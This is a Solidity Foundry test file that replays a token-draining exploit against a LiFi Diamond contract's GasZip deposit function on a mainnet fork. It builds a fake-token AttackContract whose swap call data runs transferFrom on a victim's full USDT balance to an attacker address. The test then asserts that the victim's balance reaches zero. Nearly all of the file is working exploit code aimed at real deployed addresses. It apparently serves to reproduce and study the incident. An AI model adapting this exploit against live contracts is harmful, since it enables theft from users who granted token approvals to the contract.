// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {HelpUtils} from "./HelpUtils.sol";
import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IGasZipFacet, LibSwap} from "../src/bug/interfaces/IGasZipFacet.sol";

contract AttackContract {
    function attack(
        address _diamond,
        address _token,
        address _from,
        address _recipient
    ) external payable {
        LibSwap.SwapData memory _swapData;
        _swapData.callTo = address(_token);
        _swapData.fromAmount = 1;
        _swapData.sendingAssetId = address(this);
        _swapData.approveTo = address(this);
        _swapData.callData = abi.encodeCall(
            IERC20.transferFrom,
            (_from, _recipient, IERC20(_swapData.callTo).balanceOf(_from))
        );

        IGasZipFacet(_diamond).depositToGasZipERC20(_swapData, 1, _recipient);
    }

    function balanceOf(address _account) external view returns (uint256) {
        return 2;
    }

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256) {
        return 0;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        if (amount != 0) {
            payable(msg.sender).call{value: 2}("");
        }

        return true;
    }
}

contract AttackLiFiDiamond is Test {
    uint256 constant blockNumber = 20318962;
    address constant hacker = 0x8B3Cb6Bf982798fba233Bca56749e22EEc42DcF3;
    address constant diamond = 0x1231DEB6f5749EF6cE6943a275A1D3E7486F4EaE;
    address constant sufferer = 0xABE45eA636df7Ac90Fb7D8d8C74a081b169F92eF;
    address constant usdt = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    function setUp() public {
        uint256 forkId = vm.createFork(
            vm.envString("ETH_RPC_URL"),
            blockNumber
        );
        vm.selectFork(forkId);
    }

    function _attack() internal {
        vm.startPrank(hacker);
        AttackContract attackContract = new AttackContract();
        attackContract.attack{value: 2}(diamond, usdt, sufferer, hacker);
        vm.stopPrank();
    }

    function testAttack() public {
        uint256 balance_usdt_before = IERC20(usdt).balanceOf(sufferer);
        assertGt(balance_usdt_before, 0);
        console.log("before balance_usdt:", balance_usdt_before);
        _attack();
        uint256 balance_usdt_after = IERC20(usdt).balanceOf(sufferer);
        console.log("after balance_usdt:", balance_usdt_after);
        assertEq(balance_usdt_after, 0);
    }
}

// forge test --match-contract AttackLiFiDiamond -vvv
